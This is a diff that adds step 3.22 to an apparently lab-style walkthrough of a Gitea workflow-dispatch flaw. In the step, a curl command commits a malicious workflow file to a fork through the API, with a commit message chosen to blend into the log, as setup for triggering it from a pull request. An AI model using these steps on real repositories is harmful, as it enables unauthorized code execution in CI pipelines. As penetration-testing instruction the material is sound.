@@ -2867,6 +2867,60 @@ This is CVE-2026-22555, a logic flaw in the workflow dispatch path rather than a
 <div align="center">
 <br>
 <br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
+### 3.22 — Upload the workflow to the fork
+
+**Why this step:** The malicious workflow exists only on the local filesystem. Commit it to the fork so the trigger becomes live and the file is present on the PR head commit.
+
+**Command:**
+
+```bash
+B64=$(base64 -w0 /tmp/foothold.yml)
+
+curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
+  -X POST -H "Content-Type: application/json" \
+  -d "{\"content\":\"$B64\",\"message\":\"ci\"}" \
+  "http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/DarkZero-Campaigns/contents/.gitea%2Fworkflows%2Ffoothold.yml" \
+  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('content',{}).get('name',''), d.get('message',''))"
+```
+
+**Breakdown:**
+
+|Component|Purpose|Simple Explanation|
+|---|---|---|
+|`base64 -w0`|Encode the file with no line wrapping|The API requires base64; `-w0` keeps it on one line|
+|`-X POST` to `/contents/<path>`|Create a new file at that path|Commit a file to the repository|
+|`\"content\":\"$B64\"`|The file body, base64-encoded|The workflow itself|
+|`\"message\":\"ci\"`|Commit message|Innocuous label matching normal build commits|
+|`.gitea%2Fworkflows%2Ffoothold.yml`|Percent-encoded path separators|`%2F` is `/`; encoding prevents the API from splitting the URL into path segments|
+|`darkzero-ext_josh/DarkZero-Campaigns`|The fork, not the upstream repository|Where write access exists|
+
+**Result:**
+
+```
+foothold.yml
+```
+
+Empty `message` field indicates no error; the file was created successfully.
+
+**What this gives you:** The bypass workflow committed to a branch that can be used as a pull request head.
+
+**Key findings:**
+
+- **`.gitea/workflows/foothold.yml` committed to `darkzero-ext_josh/DarkZero-Campaigns`.** The fork now carries both the original `main.yml` and the malicious `foothold.yml`.
+- The upload targets the fork exclusively. No write to the upstream repository was attempted or required — the entire attack operates from within josh's own namespace.
+- Path separators must be percent-encoded as `%2F` within the filename portion. Unencoded slashes cause the API to interpret them as URL path components and the request fails.
+- The commit message `ci` matches the naming convention of the existing pipeline, avoiding obvious anomalies in the commit log.
+
+**Next:** Open a pull request from the fork to the upstream repository, then post a review comment to trigger the workflow.
+<div align="center">
+<br>
+<br>
 ※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
 <br>
 </div>
